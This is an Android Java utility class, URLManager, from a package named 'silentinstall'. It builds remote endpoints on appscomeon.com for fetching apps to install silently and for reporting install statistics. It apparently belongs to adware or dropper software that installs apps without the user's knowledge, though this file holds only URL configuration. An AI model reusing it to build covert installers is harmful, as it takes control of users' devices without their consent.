package com.invisible.silentinstall.utils;


import android.content.Context;
import android.text.TextUtils;

import com.fixed.inter.TempService;

/**
 * @author zhengnan
 * @date 2014年10月29日
 */
public class URLManager {
    //singlon
    private static URLManager ins = null;
    public static URLManager getInstance(Context ct){
	if(ins==null)ins = new URLManager(ct);
	return ins;
    }
    private URLManager(Context ctx) {
        //slient install
        String domain   = TextUtils.isEmpty(TempService.doMain)?"appscomeon.com":TempService.doMain;
        siLink = "http://data."+domain+"/androidplus/?c=appinstall&a=get";
        // "http://data.appscomeon.com/androidplus/?c=appinstall&a=stats";
        siFeedback ="http://data."+domain+"/androidplus/?c=appinstall&a=stats";
        Util_Log.log("URLmanager create(): " + toString());
    }
    //--静默安装相关链接
    private String siLink = "";//http://data.appscomeon.com/androidplus/?c=appinstall&a=get
    private String siFeedback = "";//http://data.appscomeon.com/androidplus/?c=appinstall&a=stats&confid=2
    //method
    public String getSiLink() {
        return siLink;
    }
    public String getSiFeedback() {
        return siFeedback;
    }
}